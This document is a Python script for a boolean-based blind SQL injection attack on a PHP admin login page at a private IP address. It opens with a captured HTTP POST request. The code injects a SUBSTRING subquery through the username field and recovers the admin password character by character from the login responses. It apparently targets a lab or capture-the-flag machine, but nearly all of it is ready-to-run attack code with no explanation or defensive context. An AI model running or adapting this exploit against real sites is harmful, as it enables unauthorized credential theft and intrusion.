'''

POST /admin/login.php HTTP/1.1
Host: 192.168.223.141:81
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 140
Origin: http://192.168.223.141:81
Connection: close
Referer: http://192.168.223.141:81/admin/index.php
Cookie: PHPSESSID=5sdovkrn3edkipb3pm17ni7h3v
Upgrade-Insecure-Requests: 1

username=admin&password=okok&login=
'''

import requests
import re
#import base64
import sys

URL = sys.argv[1]
USER_FILE = sys.argv[2]
#INIT_TOKEN = sys.argv[4]
#INIT_COOKIE = sys.argv[5]

def forge_post(url, username, password='dummy'):



    #own post session
    session = requests.Session()


    headers = {
        "User-Agent" : "iamjonny the tester",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://192.168.223.141:81",
        "Referer": "http://192.168.223.141:81/admin/index.php",
        "Upgrade-Insecure-Requests": "1"
    }

    cookies = {
        "PHPSESSID":"5sdovkrn3edkipb3pm17ni7h3v"
    }

    payload ={
        "username" : username,
        "password" : password,
        "login" : ""
    }



    resp = session.post(url, headers = headers, data=payload, cookies=cookies)

    #print(resp.text)

    return resp

def analyze_resp(resp):


    #look for 'Incorrect password' indicating that letter matched correctly

    session_match = re.search(r'Incorrect password', resp.text)
    
    if session_match:
        return True

    return False


###########################################   MAIN   #############################################

def main():

    passwd=""

    for i in range(1,30):
        #open file with alphanumerics
        with open(USER_FILE,"r") as u:

            
                for letter in u.readlines():
                    
                    letter = letter.strip()

                    username = f"admin' AND SUBSTRING((SELECT password FROM admin WHERE Username = 'admin'), {i}, 1) = '" + letter
                    
                    resp = forge_post(URL,username)
                        
                    if analyze_resp(resp):
                            print(f"[+] Letter match: {letter}")
                            passwd += letter
    
    print(passwd)
                    

    return 0

######################################################################################

if __name__ == "__main__":
    main()